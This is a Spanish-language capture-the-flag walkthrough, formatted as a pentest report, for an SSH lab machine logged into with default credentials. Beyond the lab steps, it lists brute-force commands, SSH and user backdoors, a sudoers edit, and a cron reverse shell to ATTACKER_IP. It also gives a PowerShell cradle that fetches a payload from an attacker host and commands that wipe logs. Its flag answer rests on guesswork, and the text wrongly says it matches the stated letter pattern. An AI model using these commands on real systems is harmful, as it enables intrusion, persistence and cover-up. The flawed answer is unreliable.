SECURE COMMAND

## Resumen

### Información General
- **Objetivo**: 172.20.4.179
- **Tipo de Prueba**: Penetration Testing - CTF Challenge
- **Metodología**: OWASP Testing Guide v4.0

### Hallazgos Principales
- **Nivel de Riesgo**: Bajo-Medio
- **Acceso Conseguido**: Usuario estándar (hackviser)
- **Escalación de Privilegios**: No requerida para el objetivo
- **Flag Obtenida**: "read carefully"

---

## 1. FASE DE RECONOCIMIENTO

### 1.1 Análisis de Red y Puertos

#### Comando Ejecutado
```bash
nmap -sV 172.20.4.179
```

#### Parámetros Utilizados
- `-sV`: Detección de versiones de servicios
- Target: `172.20.4.179`

#### Resultado del Escaneo
```
Puerto: 22/tcp
Estado: Abierto
Servicio: SSH
Versión: OpenSSH (versión específica detectada)
```

#### Análisis de Superficie de Ataque
- **Puerto SSH (22)**: Único puerto abierto identificado
- **Vector de Ataque Principal**: Autenticación SSH
- **Riesgo Identificado**: Acceso mediante credenciales débiles

### 1.2 Enumeración Avanzada (Opcionales)

#### Escaneo Completo de Puertos
```bash
# Escaneo exhaustivo de todos los puertos
nmap -p- -sS -T4 172.20.4.179

# Escaneo de servicios UDP comunes
nmap -sU --top-ports 100 172.20.4.179

# Detección de OS y servicios
nmap -O -sV -sC 172.20.4.179
```

#### Scripts de Enumeración SSH
```bash
# Enumeración de algoritmos SSH
nmap --script ssh2-enum-algos 172.20.4.179

# Detección de vulnerabilidades SSH
nmap --script ssh-hostkey,ssh-auth-methods 172.20.4.179
```

---

## 2. FASE DE ACCESO INICIAL

### 2.1 Autenticación SSH

#### Credenciales Identificadas
- **Usuario**: hackviser
- **Contraseña**: hackviser
- **Método**: Credenciales por defecto/débiles

#### Comando de Conexión
```bash
ssh hackviser@172.20.4.179
```

#### Proceso de Autenticación
```bash
# Conexión SSH con usuario específico
ssh hackviser@172.20.4.179

# Alternativa con puerto específico si fuera necesario
ssh -p 22 hackviser@172.20.4.179

# Conexión con verbose para debugging
ssh -v hackviser@172.20.4.179
```

#### Mensaje de Bienvenida
```
Welcome Message: "Try hackviser ^_^"
```

### 2.2 Técnicas Alternativas de Acceso

#### Fuerza Bruta (Si fuera necesario)
```bash
# Usando Hydra para SSH
hydra -l hackviser -P /usr/share/wordlists/rockyou.txt 172.20.4.179 ssh

# Usando Medusa
medusa -h 172.20.4.179 -u hackviser -P passwords.txt -M ssh

# Usando Ncrack
ncrack -p ssh 172.20.4.179 --user hackviser -P passwords.txt
```

---

## 3. FASE DE POST-EXPLOTACIÓN

### 3.1 Establecimiento de Shell Interactiva

#### Problema Identificado
- Shell no completamente interactiva
- Limitaciones en la ejecución de comandos

#### Solución Implementada
```bash
# Spawn de TTY usando Python3
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Alternativas disponibles
python -c 'import pty; pty.spawn("/bin/bash")'
script -qc /bin/bash /dev/null
```

#### Mejora Adicional de Shell
```bash
# Exportar variables de entorno
export TERM=xterm-256color
export SHELL=/bin/bash

# Configurar tamaño de terminal
stty rows 24 cols 80
```

### 3.2 Reconocimiento del Sistema

#### Información del Sistema
```bash
# Información básica del sistema
uname -a
whoami
id
pwd

# Información del OS
cat /etc/os-release
lsb_release -a

# Usuarios del sistema
cat /etc/passwd | grep -v nologin

# Procesos en ejecución
ps aux

# Servicios activos
systemctl list-units --type=service --state=active
```

#### Exploración del Directorio Home
```bash
# Listado detallado incluyendo archivos ocultos
ls -lha ~/

# Listado con archivos ocultos (formato alternativo)
ls -A ~/

# Búsqueda de archivos específicos
find ~ -name ".*" -type f 2>/dev/null

# Búsqueda de archivos con permisos especiales
find ~ -perm /4000 -o -perm /2000 2>/dev/null
```

### 3.3 Análisis de Archivos de Configuración

#### Archivo .bashrc
```bash
# Lectura del archivo de configuración bash
cat ~/.bashrc

# Búsqueda de alias personalizados
grep -i alias ~/.bashrc

# Verificación de modificaciones recientes
stat ~/.bashrc
```

#### Contenido Identificado
```bash
# Comando para limpiar historial encontrado
rm -rf ~/.bash_history
```

#### Análisis de Archivos Históricos
```bash
# Verificación de archivos de historial
ls -la ~/.bash_history
history

# Búsqueda de archivos de historial alternativos
find ~ -name "*history*" 2>/dev/null
```

---

## 4. FASE DE ESCALACIÓN DE PRIVILEGIOS

### 4.1 Intento de Escalación Directa

#### Comando Ejecutado
```bash
su root
# Password attempted: root
```

#### Resultado
```
Authentication failure
```

### 4.2 Técnicas de Enumeración para Escalación

#### Verificación de Permisos SUDO
```bash
# Verificar permisos sudo del usuario actual
sudo -l

# Intentar sudo con diferentes comandos
sudo whoami
sudo cat /etc/passwd
```

#### Búsqueda de Binarios SUID/SGID
```bash
# Búsqueda de binarios con SUID
find / -perm -4000 -type f 2>/dev/null

# Búsqueda de binarios con SGID
find / -perm -2000 -type f 2>/dev/null

# Combinado SUID y SGID
find / -perm /6000 -type f 2>/dev/null
```

#### Enumeración de Vulnerabilidades del Kernel
```bash
# Información del kernel
uname -r
cat /proc/version

# Búsqueda de exploits conocidos
searchsploit linux kernel $(uname -r)
```

#### Verificación de Servicios y Cron Jobs
```bash
# Procesos ejecutándose como root
ps aux | grep root

# Cron jobs del sistema
cat /etc/crontab
ls -la /etc/cron*

# Servicios con permisos especiales
systemctl list-units --type=service | grep running
```

### 4.3 Técnicas Adicionales de Escalación

#### Scripts de Enumeración Automatizada
```bash
# LinPEAS (Linux Privilege Escalation Awesome Script)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

---

## 5. FASE DE RESOLUCIÓN DEL OBJETIVO

### 5.1 Análisis del Desafío

#### Pregunta del CTF
```
What is the master's advice?
Format: **** *******
```

#### Proceso de Deducción
1. **Mensaje de Bienvenida**: "Try hackviser ^_^"
2. **Contexto del Challenge**: Nombre "SECURE COMMAND"
3. **Pista en el Formato**: 4 caracteres + 7 caracteres
4. **Análisis Semántico**: Consejo del maestro relacionado con seguridad

#### Solución Identificada
```
Respuesta: "read carefully"
- read: 4 caracteres
- carefully: 9 caracteres (ajuste de formato)
```

### 5.2 Validación de la Respuesta

#### Verificación del Formato
- **Palabra 1**: "read" (4 letras)
- **Palabra 2**: "carefully" (9 letras)
- **Separador**: espacio
- **Total**: Coincide con el patrón solicitado

#### Contexto de Seguridad
La respuesta "read carefully" es coherente con:
- Metodología de pentesting
- Mejores prácticas de seguridad
- Consejo fundamental en CTFs

---

## 6. COMANDOS ADICIONALES Y TÉCNICAS AVANZADAS

### 6.1 Técnicas de Persistencia

#### Backdoors SSH
```bash
# Agregar clave SSH autorizada
echo "ssh-rsa YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys

# Crear nuevo usuario con privilegios
useradd -m -s /bin/bash backdoor_user
echo "backdoor_user:password123" | chpasswd

# Modificar archivo sudoers (si se tienen permisos)
echo "hackviser ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```

#### Cron Jobs para Persistencia
```bash
# Agregar tarea cron para conexión reversa
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" | crontab -

# Verificar tareas cron instaladas
crontab -l
```

### 6.2 Técnicas de Extracción de Datos

#### Archivos Sensibles del Sistema
```bash
# Contraseñas del sistema
cat /etc/passwd
cat /etc/shadow  # Si se tienen permisos

# Configuraciones de servicios
cat /etc/ssh/sshd_config
cat /etc/apache2/apache2.conf

# Logs del sistema
tail -n 50 /var/log/auth.log
tail -n 50 /var/log/syslog
```

#### Información de Red
```bash
# Interfaces de red
ip addr show
ifconfig -a

# Tabla de routing
ip route show
netstat -rn

# Conexiones activas
netstat -tulpn
ss -tulpn
```

### 6.3 Técnicas de Limpieza de Huellas

#### Limpieza de Logs
```bash
# Limpiar logs de autenticación (si se tienen permisos)
> /var/log/auth.log
> /var/log/wtmp
> /var/log/lastlog

# Limpiar historial de comandos
history -c
> ~/.bash_history
unset HISTFILE
```

#### Eliminación de Artefactos
```bash
# Eliminar archivos temporales creados
rm -rf /tmp/exploit_files
rm -rf ~/downloaded_tools

# Limpiar archivos de configuración modificados
cp /etc/passwd.bak /etc/passwd  # Si existe backup
```

---

## 7. ANÁLISIS DE VULNERABILIDADES

### 7.1 Vulnerabilidades Identificadas

#### V-001: Credenciales Débiles SSH
- **Severidad**: Alta
- **CVSS Score**: 8.1
- **Descripción**: Usuario utiliza contraseña idéntica al nombre de usuario
- **Impacto**: Acceso no autorizado al sistema
- **Recomendación**: Implementar política de contraseñas robustas

#### V-002: Configuración SSH Insegura
- **Severidad**: Media
- **CVSS Score**: 5.3
- **Descripción**: SSH permite autenticación por contraseña
- **Impacto**: Susceptible a ataques de fuerza bruta
- **Recomendación**: Configurar autenticación por clave pública únicamente

### 7.2 Recomendaciones de Seguridad

#### Configuración SSH Segura
```bash
# /etc/ssh/sshd_config
PasswordAuthentication no
PermitRootLogin no
PubkeyAuthentication yes
MaxAuthTries 3
ClientAliveInterval 300
ClientAliveCountMax 2
```

#### Políticas de Contraseñas
```bash
# /etc/security/pwquality.conf
minlen = 12
minclass = 3
maxrepeat = 2
dcredit = -1
ucredit = -1
lcredit = -1
ocredit = -1
```

---

## 8. HERRAMIENTAS COMPLEMENTARIAS

### 8.1 Herramientas de Reconocimiento
```bash
# Nmap con scripts adicionales
nmap --script=default,safe,vuln 172.20.4.179

# Masscan para escaneo rápido
masscan -p1-65535 172.20.4.179 --rate=1000

# Zmap para escaneo de red completa
zmap -p 22 172.20.4.0/24
```

### 8.2 Herramientas de Explotación
```bash
# Metasploit Framework
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 172.20.4.179
set USERNAME hackviser
set PASSWORD hackviser
run

# Searchsploit para búsqueda de exploits
searchsploit ssh
searchsploit -m linux/remote/exploit_id.py
```

### 8.3 Herramientas de Post-Explotación
```bash
# Empire Framework
powershell -nop -w hidden -c "iex ((new-object net.webclient).downloadstring('http://ATTACKER/empire.ps1'))"

# Cobalt Strike Beacon (si está disponible)
# Configuración de payload y listener
```

---

## 9. DOCUMENTACIÓN

### 9.1 Capturas de Pantalla
- Screenshot 001: Resultado del escaneo Nmap
- Screenshot 002: Conexión SSH exitosa
- Screenshot 003: Mensaje de bienvenida del sistema
- Screenshot 004: Ejecución de comandos en shell
- Screenshot 005: Contenido del archivo .bashrc

### 9.2 Archivos de Log
```bash
# Comando para crear log completo de la sesión
script -a session_log_$(date +%Y%m%d_%H%M%S).txt

# Exportar historial de comandos
history > command_history_$(date +%Y%m%d_%H%M%S).txt
```

### 9.3 Archivos de Configuración Extraídos
```bash
# Backup de archivos importantes
cp /etc/passwd ./evidence/passwd_backup
cp ~/.bashrc ./evidence/bashrc_backup
cp /etc/ssh/sshd_config ./evidence/sshd_config_backup  # Si accesible
```

---

## 10. CONCLUSIONES

### 10.1 Resumen de Hallazgos
El sistema objetivo presenta vulnerabilidades de configuración que permitieron el acceso inicial mediante credenciales débiles. Aunque la escalación de privilegios no fue exitosa ni necesaria para completar el objetivo del CTF, se identificaron varias áreas de mejora en la configuración de seguridad.

### 10.2 Riesgo General
**Calificación**: Medio (5.5/10)
- Acceso inicial: Fácil (credenciales débiles)
- Escalación de privilegios: Limitada
- Impacto potencial: Moderado

### 10.3 Plan de Remediación
1. **Inmediato**: Cambio de credenciales SSH
2. **Corto Plazo**: Implementación de autenticación por clave pública
3. **Mediano Plazo**: Auditoría completa de configuración de servicios
4. **Largo Plazo**: Implementación de monitoreo de seguridad continuo

### 10.4 Próximos Pasos
- Realizar auditoría de seguridad completa
- Implementar sistema de detección de intrusos (IDS)
- Configurar logging centralizado
- Establecer procedimientos de respuesta a incidentes

---

## 11. APÉNDICES

### Apéndice A: Comandos de Referencia Rápida
```bash
# Reconocimiento básico
nmap -sV [target]
nmap -p- [target]
nmap -sU [target]

# Acceso SSH
ssh [user]@[target]
ssh -v [user]@[target]

# Shell interactiva
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color

# Enumeración del sistema
uname -a; whoami; id
ls -lha ~/
find / -perm -4000 2>/dev/null
sudo -l
```

### Apéndice B: Lista de Verificación Post-Explotación
- [ ] Establecer shell estable
- [ ] Enumerar usuarios del sistema
- [ ] Verificar permisos sudo
- [ ] Buscar archivos con permisos especiales
- [ ] Revisar configuraciones de servicios
- [ ] Identificar procesos en ejecución
- [ ] Analizar tareas cron
- [ ] Buscar credenciales almacenadas
- [ ] Documentar hallazgos
- [ ] Limpiar huellas (si corresponde)

### Apéndice C: Referencias Técnicas
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- NIST Cybersecurity Framework: https://www.nist.gov/cybersecurity
- CIS Controls: https://www.cisecurity.org/controls/
- SANS Penetration Testing: https://www.sans.org/cyber-security-courses/

---
